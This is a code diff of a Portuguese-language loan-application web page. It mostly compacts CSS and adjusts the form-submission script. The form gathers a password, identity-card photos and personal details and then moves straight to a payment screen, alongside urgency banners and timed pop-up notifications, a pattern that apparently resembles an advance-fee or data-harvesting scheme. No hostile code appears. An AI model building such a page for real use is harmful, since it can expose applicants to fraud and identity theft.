@@ -43,7 +43,6 @@
             max-width: 100%;
         }
 
-        /* CONTAINERS RESPONSIVOS */
         .container-fixed, header, .hero, .features, .how-it-works, .trust-section, .statistics, .faq-section, .registration, footer {
             width: 100%;
             max-width: 100%;
@@ -57,7 +56,6 @@
             width: 100%;
         }
 
-        /* RESPONSIVE PADDINGS */
         @media (max-width: 768px) {
             .header-container, .hero-container, .features-grid, .steps, .trust-grid, .stats-grid, .faq-list, .form-container, .footer-container {
                 padding-left: 1rem;
@@ -75,41 +73,22 @@
             }
         }
 
-        /* AJUSTE PARA TELAS MUITO PEQUENAS (ATÉ 400px) */
         @media (max-width: 480px) {
-            body {
-                font-size: 14px;
-            }
+            body { font-size: 14px; }
             .header-container, .hero-container, .features-grid, .steps, .trust-grid, .stats-grid, .faq-list, .form-container, .footer-container {
                 padding-left: 0.75rem;
                 padding-right: 0.75rem;
             }
-            .hero h1 {
-                font-size: 1.6rem !important;
-            }
-            .section-header h2 {
-                font-size: 1.4rem !important;
-            }
-            .btn {
-                padding: 0.7rem 1.2rem !important;
-                font-size: 0.85rem !important;
-            }
+            .hero h1 { font-size: 1.6rem !important; }
+            .section-header h2 { font-size: 1.4rem !important; }
+            .btn { padding: 0.7rem 1.2rem !important; font-size: 0.85rem !important; }
         }
 
-        /* TELAS MUITO PEQUENAS (320px) */
         @media (max-width: 360px) {
-            .hero h1 {
-                font-size: 1.4rem !important;
-            }
-            .feature-card, .step, .trust-card, .stat-card {
-                padding: 1rem !important;
-            }
-            .form-container {
-                padding: 1rem !important;
-            }
-            .payment-methods {
-                grid-template-columns: 1fr !important;
-            }
+            .hero h1 { font-size: 1.4rem !important; }
+            .feature-card, .step, .trust-card, .stat-card { padding: 1rem !important; }
+            .form-container { padding: 1rem !important; }
+            .payment-methods { grid-template-columns: 1fr !important; }
         }
 
         html {
@@ -141,12 +120,8 @@
         }
 
         @media (max-width: 768px) {
-            .section-header h2 {
-                font-size: 1.6rem;
-            }
-            .section-header p {
-                font-size: 0.9rem;
-            }
+            .section-header h2 { font-size: 1.6rem; }
+            .section-header p { font-size: 0.9rem; }
         }
 
         .btn {
@@ -244,9 +219,7 @@
         }
 
         @media (max-width: 768px) {
-            .nav-toggle {
-                display: block;
-            }
+            .nav-toggle { display: block; }
             nav ul {
                 display: none;
                 position: absolute;
@@ -258,15 +231,9 @@
                 padding: 1rem;
                 box-shadow: var(--box-shadow);
             }
-            nav ul.active {
-                display: flex;
-            }
-            .header-container {
-                padding: 0.8rem 1rem;
-            }
-            .logo {
-                font-size: 1.2rem;
-            }
+            nav ul.active { display: flex; }
+            .header-container { padding: 0.8rem 1rem; }
+            .logo { font-size: 1.2rem; }
         }
 
         .hero {
@@ -287,9 +254,7 @@
             margin-bottom: 1rem;
         }
 
-        .hero h1 span {
-            color: var(--primary);
-        }
+        .hero h1 span { color: var(--primary); }
 
         .hero-badge {
             display: inline-block;
@@ -330,25 +295,12 @@
         }
 
         @media (max-width: 768px) {
-            .hero {
-                padding: 2rem 0.75rem;
-            }
-            .hero-container {
-                grid-template-columns: 1fr;
-                gap: 1.5rem;
-            }
-            .hero h1 {
-                font-size: 1.8rem;
-            }
-            .hero-buttons {
-                justify-content: center;
-            }
-            .stats-premium {
-                justify-content: center;
-            }
-            .hero-content {
-                text-align: center;
-            }
+            .hero { padding: 2rem 0.75rem; }
+            .hero-container { grid-template-columns: 1fr; gap: 1.5rem; }
+            .hero h1 { font-size: 1.8rem; }
+            .hero-buttons { justify-content: center; }
+            .stats-premium { justify-content: center; }
+            .hero-content { text-align: center; }
         }
 
         .urgency-banner {
@@ -497,12 +449,8 @@
         }
 
         @media (max-width: 768px) {
-            .features {
-                padding: 2rem 0.75rem;
-            }
-            .feature-card {
-                padding: 1.2rem;
-            }
+            .features { padding: 2rem 0.75rem; }
+            .feature-card { padding: 1.2rem; }
         }
 
         .how-it-works {
@@ -546,12 +494,8 @@
         }
 
         @media (max-width: 768px) {
-            .how-it-works {
-                padding: 2rem 0.75rem;
-            }
-            .step {
-                padding: 1.2rem;
-            }
+            .how-it-works { padding: 2rem 0.75rem; }
+            .step { padding: 1.2rem; }
         }
 
         .trust-section {
@@ -665,9 +609,7 @@
             margin-bottom: 1rem;
         }
 
-        .payment-method input {
-            display: none;
-        }
+        .payment-method input { display: none; }
 
         .payment-method label {
             display: flex;
@@ -741,18 +683,9 @@
                 margin-left: auto;
                 margin-right: auto;
             }
-            .payment-methods {
-                grid-template-columns: 1fr;
-                gap: 0.6rem;
-            }
-            .payment-method label {
-                flex-direction: row;
-                justify-content: center;
-                gap: 0.5rem;
-            }
-            .loan-calculator {
-                padding: 1rem;
-            }
+            .payment-methods { grid-template-columns: 1fr; gap: 0.6rem; }
+            .payment-method label { flex-direction: row; justify-content: center; gap: 0.5rem; }
+            .loan-calculator { padding: 1rem; }
         }
 
         .faq-section {
@@ -946,9 +879,7 @@
         }
 
         @media (max-width: 768px) {
-            .floating-request-btn {
-                display: flex;
-            }
+            .floating-request-btn { display: flex; }
         }
 
         @media (max-width: 480px) {
@@ -991,9 +922,7 @@
             font-size: 1.5rem;
         }
 
-        .chatbot-button:hover {
-            transform: scale(1.05);
-        }
+        .chatbot-button:hover { transform: scale(1.05); }
 
         .chatbot-window {
             position: fixed;
@@ -1137,10 +1066,7 @@
                 left: 15px;
                 bottom: 150px;
             }
-            .chatbot-button {
-                right: 15px;
-                bottom: 85px;
-            }
+            .chatbot-button { right: 15px; bottom: 85px; }
         }
 
         .error-modal {
@@ -1233,9 +1159,7 @@
             color: var(--gray);
         }
 
-        .explanation-box ul {
-            margin-left: 1rem;
-        }
+        .explanation-box ul { margin-left: 1rem; }
 
         .payment-info-box {
             background: linear-gradient(135deg, #FEF3C7, #FFE4B5);
@@ -1306,15 +1230,12 @@
             font-size: 0.9rem;
         }
 
-        /* Ajustes adicionais para evitar overflow */
         img, iframe, video {
             max-width: 100%;
             height: auto;
         }
 
-        input, select, textarea, button {
-            max-width: 100%;
-        }
+        input, select, textarea, button { max-width: 100%; }
 
         .container-fixed, .hero-container, .features-grid, .steps, .trust-grid, .stats-grid, .faq-list, .form-container, .footer-container {
             overflow-x: hidden;
@@ -1687,7 +1608,7 @@
                 <label for="terms" style="display: inline;">Aceito os Termos e Condições</label>
             </div>
 
-            <button type="submit" class="btn btn-primary" style="width: 100%;">Iniciar Solicitação <i class="fas fa-arrow-right"></i></button>
+            <button type="submit" class="btn btn-primary" style="width: 100%;" id="submitLoanBtn">Iniciar Solicitação <i class="fas fa-arrow-right"></i></button>
         </form>
     </div>
 
@@ -2011,16 +1932,17 @@ document.addEventListener('DOMContentLoaded', function() {
     }
     setTimeout(scheduleNotifications, 3000);
     
-    // ========== FORM SUBMISSION ==========
+    // ========== FORM SUBMISSION - DIRETO PARA O RESUMO DO EMPRÉSTIMO ==========
     let storedReceiverNumber = '', storedPhoneNumber = '', storedFullName = '', storedConfirmName = '', storedPaymentMethod = '';
     
     function proceedToPayment() {
+        // Validação dos documentos
         const biFrontFile = document.getElementById('biFront')?.files[0];
         const biBackFile = document.getElementById('biBack')?.files[0];
         
         if (!biFrontFile || !biBackFile) {
             showNotif('Envie frente e verso do BI', 'error');
-            return;
+            return false;
         }
         
         const amount = parseInt(document.getElementById('loanAmount')?.value || 50000);
@@ -2034,9 +1956,10 @@ document.addEventListener('DOMContentLoaded', function() {
         
         if (!receiverNumber || !confirmName || !phoneNumber) {
             showNotif('Preencha todos os dados de recebimento', 'error');
-            return;
+            return false;
         }
         
+        // Preenche o resumo do empréstimo
         const summaryDiv = document.getElementById('loanSummaryPremium');
         if (summaryDiv) {
             summaryDiv.innerHTML = `
@@ -2054,6 +1977,7 @@ document.addEventListener('DOMContentLoaded', function() {
             `;
         }
         
+        // Preenche os detalhes de pagamento
         const paymentDetails = document.getElementById('paymentDetails');
         if (paymentDetails) {
             paymentDetails.innerHTML = `
@@ -2070,10 +1994,17 @@ document.addEventListener('DOMContentLoaded', function() {
             });
         }
         
+        // Mostra a tela de pagamento com o resumo
         document.getElementById('formContainer').style.display = 'none';
         document.getElementById('paymentInstructions').style.display = 'block';
+        
+        // Scroll suave até o topo da seção de pagamento
+        document.getElementById('paymentInstructions').scrollIntoView({ behavior: 'smooth', block: 'start' });
+        
+        return true;
     }
     
+    // Evento do botão "Iniciar Solicitação"
     document.getElementById('loanForm')?.addEventListener('submit', function(e) {
         e.preventDefault();
         
@@ -2087,6 +2018,7 @@ document.addEventListener('DOMContentLoaded', function() {
         const terms = document.getElementById('terms')?.checked;
         const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked')?.value;
         
+        // Validações
         if (!fullName || !phoneNumber || !password || !confirmPassword || !biNumber) {
             showNotif('Preencha todos os campos obrigatórios', 'error');
             return;
@@ -2112,17 +2044,21 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
         
+        // Armazena os dados
         storedReceiverNumber = receiverNumber;
         storedPhoneNumber = phoneNumber;
         storedFullName = fullName;
         storedConfirmName = confirmName;
         storedPaymentMethod = paymentMethod;
+        
+        // Prossegue diretamente para o resumo do empréstimo
         proceedToPayment();
     });
     
     document.getElementById('backToFormBtn')?.addEventListener('click', () => {
         document.getElementById('formContainer').style.display = 'block';
         document.getElementById('paymentInstructions').style.display = 'none';
+        document.getElementById('formContainer').scrollIntoView({ behavior: 'smooth', block: 'start' });
     });
     
     document.getElementById('paymentUSSDButton')?.addEventListener('click', () => {
